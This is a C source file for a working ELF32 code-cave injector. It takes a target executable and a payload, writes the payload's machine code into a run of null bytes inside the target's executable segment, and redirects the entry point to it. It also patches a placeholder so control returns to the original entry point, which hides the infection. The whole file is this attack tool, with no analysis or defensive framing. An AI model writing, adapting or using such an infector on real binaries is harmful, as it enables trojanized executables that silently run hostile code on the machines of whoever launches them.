#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <elf.h>
#include <sys/mman.h>

int main (int argc, char *argv[]) {

	/********************************************************************************************************
	|													|							
	| (0) check number of arguments										|
	|													|
	********************************************************************************************************/

	if (argc != 3) {
		fprintf(stderr, "[!] Usage: %s <target> <payload>\n", argv[0]);
		exit(1);
	}

	/********************************************************************************************************
	|													|							
	| (1) open and map target file 										|
	|													|
	********************************************************************************************************/

	int 		t_fd, t_size;
	struct 		stat _info; 
	void		*t_addr;

	// open target file
	if ((t_fd = open(argv[1], O_APPEND | O_RDWR, 0)) < 0) {
		perror("[!] open:");	
		exit(1);	
	}		
    
	// get target file disk size
  	fstat (t_fd, &_info);
  	t_size = _info.st_size;

	// map target file to memory
	if ((t_addr = mmap(0, t_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, t_fd, 0)) == MAP_FAILED) {
		perror("[!] mmap:");	
		exit(1);	
	}

	/********************************************************************************************************
	|													|							
	| (2) get target file info										|
	|													|
	********************************************************************************************************/

	Elf32_Ehdr	*t_ehdr;

	// get ELF header
	t_ehdr = (Elf32_Ehdr *) t_addr;

	/********************************************************************************************************
	|													|							
	| (3) get payload info											|
	|													|
	********************************************************************************************************/

	/************************************
	| (a) open and map payload file     |									
	************************************/

	int		p_fd, p_size;
	void		*p_addr;

	// open payload file
	if ((p_fd = open(argv[2], O_APPEND | O_RDWR, 0)) < 0) {
		perror("[!] open:");	
		exit(1);	
	}		
    
	// get payload file disk size
  	fstat (p_fd, &_info);
  	p_size = _info.st_size;

	// map payload file to memory
	if ((p_addr = mmap(0, p_size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, p_fd, 0)) == MAP_FAILED) {
		perror("[!] mmap:");	
		exit(1);	
	}

	/************************************
	| (b) get payload .text section	    |								
	************************************/

	int		i, sc_size;
	char		*strtab_addr, *pres_name;	 
	Elf32_Ehdr	*p_ehdr;
	Elf32_Shdr 	*p_shdr, *text_shdr, *strtab_shdr;

	// get payload headers
	p_ehdr = (Elf32_Ehdr *) p_addr;
	p_shdr = p_addr + p_ehdr->e_shoff;

	// get string table info
	strtab_shdr = &p_shdr[p_ehdr->e_shstrndx];	
	strtab_addr = p_addr + strtab_shdr->sh_offset;
	
	// find .text section
	for (i = 0; i < p_ehdr->e_shnum; i++) {
		pres_name = (char*) (strtab_addr + p_shdr[i].sh_name);
      		if (!strcmp (pres_name, ".text")) { 
			text_shdr = &p_shdr[i];
			break;
		}
    	}

	/************************************
	| (c) get payload size		    |								
	************************************/

	sc_size = text_shdr->sh_size;

	/********************************************************************************************************
	|													|							
	| (4) find code cave											|
	|													|
	********************************************************************************************************/

	/************************************
	| (a) find executable load segment  |									
	************************************/
	
	int		seg_size = 0;
	Elf32_Phdr 	*t_phdr;

	// get first program header
	t_phdr = (Elf32_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);

	// find executable load segment 
	for (i = 0; i < t_ehdr->e_phnum; i++) {
		if (t_phdr->p_type == PT_LOAD && t_phdr->p_flags & 0x11) {
			break;
		}
		t_phdr = (Elf32_Phdr *) ((unsigned char*) t_phdr + (unsigned int) t_ehdr->e_phentsize);
	}

	// get segment size
	while (seg_size < t_phdr->p_filesz) {
		seg_size += t_phdr->p_align; 
	}
	
	/************************************
	| (b) find code cave                |									
	************************************/

	int		cc_offset, count = 0;
	void 		*t_seg_ptr = t_addr + t_phdr->p_offset;

	for (i = 0; i < seg_size; i++) {
		if (*(char *)t_seg_ptr == 0x00) {	// if null byte
			if (count == 0) {		// if first null byte, set codecave address to ptr
				cc_offset = t_phdr->p_offset + i;
			}	
			count++;			// increment count, test is size sufficient
			if (count == sc_size) {
				break;
			}
		}
		else {					// if not null byte, reset
			count = 0;
		}
		t_seg_ptr++;				// increment ptr
	}

	if (count == 0) {				// if no sufficient codecave found, error and exit
		fprintf(stderr, "[!] codecave: no sufficiently large codecave found\n");
		exit(1);
	}	
	
	/********************************************************************************************************
	|													|							
	| (5) inject shellcode into code cave									|
	|													|
	********************************************************************************************************/

	// get address of payload
	void 		*sc_addr = p_addr + text_shdr->sh_offset;
	
	// copy payload to code cave
	memmove(t_addr + cc_offset, sc_addr, sc_size);

	/********************************************************************************************************
	|													|							
	| (6) patch target file											|
	|													|
	********************************************************************************************************/
	
	/************************************
	| (a) set entry point to payload    |									
	************************************/
	
	Elf32_Addr	*base;
	Elf32_Phdr 	*t_phdr2 = (Elf32_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);	
	Elf32_Addr	oep; 

	// get original entry point (oep)
	oep = t_ehdr->e_entry;
	
	// find base
	for (i = 0; i < t_ehdr->e_phnum; i++) {
		if (t_phdr2->p_type == PT_LOAD) {
			base = (Elf32_Addr *)t_phdr2->p_vaddr;
			break;
		}
		t_phdr2 = (Elf32_Phdr *) ((unsigned char *) t_phdr2 + (unsigned int) t_ehdr->e_phentsize);
	}

	// replace entry point with address of payload
	t_ehdr->e_entry = (unsigned int) base + cc_offset; 
	
	/************************************
	| (b) point payload to entry point  |									
	************************************/

	long		substr;
	void		*sc_ptr = t_addr + cc_offset;
	
	for (i = 0; i < sc_size-4; i++) {
		substr = *(unsigned int *) (sc_ptr + i);
		if (substr == 0xAAAAAAAA) {
			*(unsigned int *) (sc_ptr + i) = oep; 
			break;
		}
	}
	
	/************************************
	| (c) augment executable segment    |									
	************************************/
	
	t_phdr->p_memsz += sc_size;

	/************************************
	| (d) augment relevent section	    |									
	************************************/
	
	// get payload headers
	Elf32_Shdr 	*t_shdr = t_addr + t_ehdr->e_shoff;

	// iterate over number of sections
	for (i = 0; i < t_ehdr->e_shnum - 1; i++) {
		if (t_shdr[i].sh_offset < cc_offset && t_shdr[i + 1].sh_offset > cc_offset) { 
			t_shdr[i].sh_size += sc_size;			
		}
	}
	
	// close target and payload file
	close(t_fd);								
	close(p_fd);								

	exit(0);
}
